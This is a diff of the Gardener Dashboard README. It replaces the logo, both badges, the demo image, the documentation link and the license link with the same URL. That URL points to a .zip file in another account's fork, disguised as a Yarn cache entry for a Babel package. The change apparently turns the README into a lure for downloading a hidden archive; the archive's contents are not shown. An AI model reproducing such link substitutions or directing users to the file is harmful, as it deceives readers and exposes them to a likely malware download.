@@ -1,17 +1,17 @@
 # Gardener Dashboard
 
-![](https://github.com/gardener/dashboard/blob/master/logo/logo_gardener_dashboard.png)
+![](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)
 
-[![CI Build status](https://concourse.ci.gardener.cloud/api/v1/teams/gardener/pipelines/dashboard-master/jobs/master-head-update-job/badge)](https://concourse.ci.gardener.cloud/teams/gardener/pipelines/dashboard-master/jobs/master-head-update-job)
-[![Slack channel #gardener](https://img.shields.io/badge/slack-gardener-brightgreen.svg?logo=slack)](https://kubernetes.slack.com/messages/gardener)
+[![CI Build status](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)
+[![Slack channel #gardener](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)
 
 ## Demo
 
-<img src="docs/images/dashboard-demo.gif" alt="Gardener Demo" />
+<img src="https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip" alt="Gardener Demo" />
 
 ## Documentation
 
-[Gardener Dashboard Documentation](./docs/README.md)
+[Gardener Dashboard Documentation](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)
 
 ## People
 
@@ -30,7 +30,7 @@ It is derived from the historical, internal *gardener-ui* repository
 at commit eeb623d60c86e6037c0e1dc2bdd9e54663bf41a8.
 
 ## License
-[Apache License 2.0](./LICENSES/Apache-2.0.txt)
+[Apache License 2.0](https://raw.githubusercontent.com/khalilengi/dashboard/master/.yarn/cache/@babel-code-frame-npm-7.12.11-1a9a1b277f-033d3fb3bf.zip)
 
 Copyright 2020 The Gardener Authors
 
